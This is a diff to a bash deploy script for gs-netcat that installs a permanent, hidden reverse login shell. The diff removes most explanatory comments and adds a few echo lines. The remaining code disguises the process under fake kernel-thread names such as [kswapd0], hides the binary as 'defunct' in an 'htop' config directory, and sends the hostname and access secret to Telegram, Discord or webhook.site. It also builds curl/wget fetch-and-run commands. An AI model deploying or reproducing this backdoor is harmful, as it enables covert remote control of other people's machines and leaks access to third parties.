@@ -1,70 +1,5 @@
 #! /usr/bin/env bash
 
-# Install and start a permanent gs-netcat reverse login shell
-#
-# See https://www.gsocket.io/deploy/ for examples.
-#
-# This script is typically invoked like this as root or non-root user:
-#   $ bash -c "$(curl -fsSL https://gsocket.io/x)"
-#
-# Connect
-#   $ S=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)""
-# Pre-set a secret:
-#   $ X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
-# Uninstall
-#   $ GS_UNDO=1 bash -c" $(curl -fsSL https://gsocket.io/x)"
-#
-# Other variables:
-# GS_DEBUG=1
-#		- Verbose output
-#		- Shorter timeout to restart crontab etc
-#       - Often used like this:
-#         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
-#         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_USELOCAL_GSNC=../tools/gs-netcat GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
-# GS_USELOCAL=1
-#       - Use local binaries (do not download)
-# GS_USELOCAL_GSNC=<path to gs-netcat binary>
-#       - Use local gs-netcat from source tree
-# GS_NOSTART=1
-#       - Do not start gs-netcat (for testing purpose only)
-# GS_NOINST=1
-#		- Do not install gsocket
-# GS_OSARCH=x86_64-alpine
-#       - Force architecutre to a specific package (for testing purpose only)
-# GS_PREFIX=
-#		- Use 'path' instead of '/' (needed for packaging/testing)
-# GS_URL_BASE=https://gsocket.io
-#		- Specify URL of static binaries
-# GS_URL_BIN=
-#		- Specify URL of static binaries, defaults to https://${GS_URL_BASE}/bin
-# GS_DSTDIR="/tmp/foobar/blah"
-#		- Specify custom installation directory
-# GS_HIDDEN_NAME="-bash"
-#       - Specify custom hidden name for process, default is [kcached]
-# GS_BIN_HIDDEN_NAME="gs-dbus"
-#       - Specify custom name for binary on filesystem (default is gs-dbus)
-#       - Set to GS_HIDDEN_NAME if GS_HIDDEN_NAME is specified.
-# GS_DL=wget
-#       - Command to use for download. =wget or =curl.
-# GS_TG_TOKEN=
-#       - Telegram Bot ID, =5794110125:AAFDNb...
-# GS_TG_CHATID=
-#       - Telegram Chat ID, =-8834838...
-# GS_DISCORD_KEY=
-#       - Discord API key, ="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
-# GS_WEBHOOK_KEY=
-#       - https://webhook.site key, ="dc3c1af9-ea3d-4401-9158-eb6dda735276"
-# GS_WEBHOOK=
-#       - Generic webhook, ="https://foo.blah/log.php?s=\${GS_SECRET}"
-# GS_HOST=
-#       - IP or HOSTNAME of the GSRN-Server. Default is to use THC's infrastructure.
-#       - See https://github.com/hackerschoice/gsocket-relay
-# GS_PORT=
-#       - Port for the GSRN-Server. Default is 443.
-# TMPDIR=
-#       - Guess what...
-
-# Global Defines
 URL_BASE_CDN="https://cdn.gsocket.io"
 URL_BASE_X="https://gsocket.io"
 [[ -n $GS_URL_BASE ]] && {
@@ -85,31 +20,22 @@ GS_WEBHOOK_404_OK=
 [[ -n $gs_deploy_webhook ]] && GS_WEBHOOK="$gs_deploy_webhook"
 unset gs_deploy_webhook
 
-# WEBHOOKS are executed after a successfull install
-# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
 msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
-### Telegram
-# GS_TG_TOKEN="5794110125:AAFDNb..."
-# GS_TG_CHATID="-8834838..."
 [[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
 	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
 	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
 }
-### Generic URL as webhook (any URL)
 [[ -n $GS_WEBHOOK ]] && {
 	GS_WEBHOOK_CURL=("$GS_WEBHOOK")
 	GS_WEBHOOK_WGET=("$GS_WEBHOOK")
 }
-### webhook.site
-# GS_WEBHOOK_KEY="dc3c1af9-ea3d-4401-9158-eb6dda735276"
 [[ -n $GS_WEBHOOK_KEY ]] && {
-	# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
 	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "gs-netcat -i -s ${GS_SECRET}"}'
 	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
 	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
 }
-### discord webhook
-# GS_DISCORD_KEY="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
+
+
 [[ -n $GS_DISCORD_KEY ]] && {
 	data='{"username": "gsocket", "content": "'"${msg}"'"}'
 	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
@@ -121,20 +47,16 @@ unset msg
 DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
 BIN_HIDDEN_NAME_DEFAULT="defunct"
-# Can not use '[kcached/0]'. Bash without bashrc shows "/0] $" as prompt. 
+ 
 proc_name_arr=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
-# Pick a process name at random
 PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
 for str in "${proc_name_arr[@]}"; do
 	PROC_HIDDEN_NAME_RX+="|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')"
 done
 PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"
 
-# PROC_HIDDEN_NAME_DEFAULT="[rcu_preempt]"
-# ~/.config/<NAME>
 CONFIG_DIR_NAME="htop"
 
-# Names for 'uninstall' (including names from previous versions)
 BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT" "gs-dbus" "gs-db")
 CONFIG_DIR_NAME_RM=("$CONFIG_DIR_NAME" "dbus")
 
@@ -1344,8 +1266,11 @@ dl()
 
 	if [[ -n $IS_USE_CURL ]]; then
 		dl_ssl "-k" "certificate problem" "${DL[@]}" "${URL_BIN}/${1}" "--output" "${2}"
+        echo "Downloading from: ${URL_BIN}/${1}"
 	elif [[ -n $IS_USE_WGET ]]; then
 		dl_ssl "--no-check-certificate" "is not trusted" "${DL[@]}" "${URL_BIN}/${1}" "-O" "${2}"
+        echo "Downloading from: ${URL_BIN}/${1}"
+
 	else
 		# errexit "Need curl or wget."
 		FAIL_OUT "CAN NOT HAPPEN"
@@ -1639,7 +1564,6 @@ init_vars
 [[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
 
 init_setup
-# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
 [[ -n "$X" ]] && GS_SECRET_X="$X"
 
 if [[ -z $S ]]; then
@@ -1664,7 +1588,6 @@ fi
 
 try "$OSARCH" "$SRC_PKG"
 
-# [[ -z "$GS_OSARCH" ]] && [[ -z "$IS_TESTBIN_OK" ]] && try_any
 WARN_EXECFAIL
 [[ -z "$IS_TESTBIN_OK" ]] && errexit "None of the binaries worked."
 
